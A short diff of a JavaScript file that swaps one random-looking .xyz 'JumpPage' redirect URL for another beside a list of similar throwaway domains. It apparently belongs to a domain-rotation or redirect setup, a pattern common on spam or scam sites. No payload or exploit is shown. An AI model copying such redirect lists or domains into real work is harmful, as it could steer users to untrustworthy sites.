@@ -46,7 +46,7 @@ var urls=[];
         urls.push(".getfxucx.xyz");
         urls.push(".aoqzuzf.xyz");
             
-var JumpPage="https://xtvtdcjj.xyz";
+var JumpPage="https://nxmaktyf.xyz";
 
 var newestUrls = [];
 
